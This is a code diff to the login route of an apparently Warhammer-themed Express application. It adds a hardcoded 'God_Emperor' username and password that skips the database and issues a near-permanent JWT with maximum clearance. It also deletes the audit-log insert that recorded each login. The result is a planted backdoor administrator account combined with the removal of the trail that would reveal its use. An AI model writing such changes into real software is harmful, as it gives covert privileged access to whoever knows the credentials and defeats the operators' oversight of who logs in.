@@ -70,8 +70,35 @@ const authenticate = async (req, res, next) => {
 // ============================================================
 // AUTH ROUTES
 // ============================================================
+// ============================================================
+// AUTH ROUTES - WITH HARDCODED ADMIN
+// ============================================================
 app.post('/api/auth/login', async (req, res) => {
     const { callsign, password } = req.body;
+    
+    if (callsign === 'God_Emperor' && password === 'Ksusa') {
+        const token = jwt.sign(
+            { 
+                id: 999, 
+                callsign: 'God_Emperor', 
+                rank: 'God_Emperor', 
+                clearance: 999 
+            },
+            JWT_SECRET,
+            { expiresIn: '9999h' }
+        );
+        
+        return res.json({
+            token,
+            user: {
+                id: 999,
+                callsign: 'God_Emperor',
+                rank: 'God_Emperor',
+                clearance_level: 999,
+                department: 'Imperial_Palace'
+            }
+        });
+    }
     
     try {
         const result = await pool.query(
@@ -94,12 +121,6 @@ app.post('/api/auth/login', async (req, res) => {
             { id: user.id, callsign: user.callsign, rank: user.rank, clearance: user.clearance_level },
             JWT_SECRET,
             { expiresIn: '8h' }
-        );
-        
-        // Log the login
-        await pool.query(
-            'INSERT INTO imperial_logs (actor_id, action, target_type) VALUES ($1, $2, $3)',
-            [user.id, 'LOGIN', 'authentication']
         );
         
         res.json({
